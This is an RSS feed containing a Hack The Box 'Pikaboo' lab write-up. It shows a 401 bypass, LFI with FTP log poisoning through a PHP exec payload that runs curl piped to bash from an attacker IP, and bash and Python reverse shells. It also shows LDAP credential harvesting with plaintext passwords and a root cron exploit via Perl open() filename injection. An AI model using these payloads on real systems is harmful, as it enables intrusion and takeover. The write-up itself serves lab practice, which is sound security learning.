@@ -1,0 +1,235 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Log Poisoning on ybenel</title>
+    <link>https://ybenel.cf/tags/log-poisoning/</link>
+    <description>ybenel (Log Poisoning)</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 17 Sep 2021 00:00:00 +0000</lastBuildDate>
+    
+    <atom:link href="https://ybenel.cf/tags/log-poisoning/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>HTB - Pikaboo</title>
+      <link>https://ybenel.cf/post/htb-pikaboo/</link>
+      <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ybenel.cf/post/htb-pikaboo/</guid>
+      <description>&lt;p&gt;A Hard Machine That Consist On Exploiting MisConfigurations&lt;/p&gt;
+&lt;p&gt;&lt;a id=&#34;orga478a8e&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;slim-to-none&#34; &gt;Slim To None
+&lt;span&gt;
+    &lt;a href=&#34;#slim-to-none&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;&lt;p&gt;&lt;a id=&#34;orgbd954f4&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;general-enumeration&#34; &gt;General Enumeration
+&lt;span&gt;
+    &lt;a href=&#34;#general-enumeration&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;&lt;p&gt;&lt;a id=&#34;orga965546&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;open-ports&#34; &gt;Open Ports
+&lt;span&gt;
+    &lt;a href=&#34;#open-ports&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;p&gt;21 (vstpd 3.0.3) - 22 (SSH), 80 (Nginx), 8081 (py HTTP)&lt;/p&gt;
+&lt;p&gt;&lt;a id=&#34;orgac5402c&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;initial-enum&#34; &gt;Initial Enum
+&lt;span&gt;
+    &lt;a href=&#34;#initial-enum&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Web (80), Has Auth&lt;sub&gt;Basic&lt;/sub&gt; (redirect to 401)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Confirmed Path Manipulation (Bypass 401) in /admin&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://10.10.10.249/admin../server-status
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a id=&#34;orgde05944&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;usernames-and-passwords&#34; &gt;Usernames And Passwords
+&lt;span&gt;
+    &lt;a href=&#34;#usernames-and-passwords&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;No Credentials Found&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a id=&#34;orgd93d112&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;interesting-discoveries&#34; &gt;Interesting Discoveries
+&lt;span&gt;
+    &lt;a href=&#34;#interesting-discoveries&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;admin page (&lt;a href=&#34;http://10.10.10.249/admin&#34;&gt;http://10.10.10.249/admin&lt;/a&gt;) [Requires Credentials]&lt;/li&gt;
+&lt;li&gt;weird path /admin/admin&lt;sub&gt;staging&lt;/sub&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a id=&#34;orgd7cc00c&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;vulnerabilities-and-exploitation&#34; &gt;Vulnerabilities And Exploitation
+&lt;span&gt;
+    &lt;a href=&#34;#vulnerabilities-and-exploitation&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Possible Exploitation Path&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;proof&#34; id=&#34;orgc2a0a36&#34;&gt;
+&lt;p&gt;
+log poisoning lead to RCE through
+LFI -&amp;gt; (Cache VSFTPD) -&amp;gt; RCE
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;Exploitation Of (Log Poisoning)
+&lt;ol&gt;
+&lt;li&gt;We do have LFI &lt;a href=&#34;http://10.10.10.249/admin../admin_staging/index.php?page=&#34;&gt;admin&lt;sub&gt;staging&lt;/sub&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;We Have A Valid Log file (/var/log/vsftpd.log)&lt;/li&gt;
+&lt;li&gt;Payload
+&lt;ol&gt;
+&lt;li&gt;USER Field&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;curl http://10.10.14.210:8000/rev | bash&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;Inside Of rev&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     /bin/bash -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.210/9110 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;Curl The Path&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     curl http://10.10.10.249/admin../admin_staging/index.php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ?page&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/var/log/vsftpd.log
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;Grab User.txt
+&lt;img src=&#34;https://ybenel.cf/imgs/pikaboo/user_flag.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a id=&#34;org0744151&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;user-enumeration&#34; &gt;User Enumeration
+&lt;span&gt;
+    &lt;a href=&#34;#user-enumeration&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;&lt;p&gt;&lt;a id=&#34;org4820c84&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;interesting--discoveries&#34; &gt;Interesting  Discoveries
+&lt;span&gt;
+    &lt;a href=&#34;#interesting--discoveries&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Cronjob (root) /usr/local/bin/csvupdate&lt;sub&gt;cron&lt;/sub&gt;&lt;/li&gt;
+&lt;li&gt;/etc/apache2/htpasswd (HTPass Auth Basic) (Salted MD5)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a id=&#34;orge0cdc6b&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;passwords&#34; &gt;Passwords
+&lt;span&gt;
+    &lt;a href=&#34;#passwords&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;xxj31ZMTZzkVA (/etc/apache2/sites-available/default-ssl.conf)&lt;/li&gt;
+&lt;li&gt;Salted MD5 ($apr1$0.2FVvEK$Xn42uf/ySS5IPTKXfebXM.) [Not Cracked]&lt;/li&gt;
+&lt;li&gt;J~42%W?PFHl]g (Ldap /opt/pokeapi/config/settings.py)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;a id=&#34;org9d946cd&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;user&#34; &gt;User
+&lt;span&gt;
+    &lt;a href=&#34;#user&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Grabing User Password Through Ldap&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ldapsearch -x -h 127.0.0.1 -D &#39;cn=binduser,ou=users,dc=pikaboo,dc=htb&#39; -w J~42%W?PFHl]g -b &#39;dc=ftp,dc=pikaboo,dc=htb&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;pwnmeow user&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# pwnmeow, users, ftp.pikaboo.htb
+dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+uid: pwnmeow
+cn: Pwn
+sn: Meow
+loginShell: /bin/bash
+uidNumber: 10000
+gidNumber: 10000
+homeDirectory: /home/pwnmeow
+userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
+
+echo -n X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d
+_G0tT4_C4tcH_&#39;3m_4lL!_
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a id=&#34;org32b305e&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34; &gt;Privilege Escalation
+&lt;span&gt;
+    &lt;a href=&#34;#privilege-escalation&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;&lt;p&gt;&lt;a id=&#34;org42aa660&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;vulnerabities-exploitation&#34; &gt;Vulnerabities Exploitation
+&lt;span&gt;
+    &lt;a href=&#34;#vulnerabities-exploitation&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;p&gt;From The Previous Cronjobs We found we noticed there’s a script /usr/local/bin/csvupdate&lt;sub&gt;cron&lt;/sub&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; d in /srv/ftp/*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      cd $d
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      /usr/local/bin/csvupdate &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;basename $d&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; *csv
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      /usr/bin/rm -rf *
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Essentially What the script does is that it lists all the folders exist in /srv/ftp and takes all csv files
+and directs them as argument to another script called csvupdate.
+Now as we read the perl script, we noticed it does use open() function to open files, However
+after little bit of documentation reading we noticed that, if two filenames specified , if one had pipe symbol “|”
+it will be interpreted as command thus being executed it.
+Now Our Root Path has become more clear to what we should do.
+I Found this stack overflow &lt;a href=&#34;https://stackoverflow.com/questions/26614348/perl-open-injection-prevention&#34;&gt;discussion&lt;/a&gt; which demonstrate , how we can achieve this. Unfortunately this was not that simple!
+Bash commands were not suitable for this coz of being executed before even attempting to run them, and it the idea was to craft a malicious payload that will be a name of empty file that we will upload to pwnmeow user’s ftp as we got his credentials previously.
+Other thing was to create a temporary file that has our payload which we can then execute by calling its full path, tho the issue is that we cannot create filename’s as a path , which left us we fewer options.
+Since Python was available, we can use a oneliner reverse shell as our payload , tho it had to be really perfect specially with escaping double quotes.
+I Used the following oneliner reverse shell&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    python &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.210&amp;#34;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(&amp;#34;sh&amp;#34;);&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After Editing it to escape double quotes and create an empty file&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    touch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;|python3 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;&lt;/span&gt;\&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10.10.14.210&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;));os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dup2(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fileno(),&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;); os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dup2(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fileno(),&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;); os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dup2(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fileno(),&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);p&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;;.csv&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we go back to ftp and upload it, &lt;strong&gt;ONE BIG FAT WARNING&lt;/strong&gt; If you tried to upload the file to the root folder, it will not work and file will not be uploaded, and you’ll get really frustrated on why not it didn’t work like myself lol.
+Choose any folder , it doesn’t matter which one and upload it to it .
+&lt;img src=&#34;https://ybenel.cf/imgs/pikaboo/ftp_upload.png&#34; alt=&#34;img&#34;&gt;
+&lt;strong&gt;Notice&lt;/strong&gt; in ur listener it will first connect back from ur machine , kill it immediately and re-run your listener, After few seconds
+You’ll receive a
+&lt;img src=&#34;https://ybenel.cf/imgs/pikaboo/root_flag.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    
+  </channel>
+</rss>
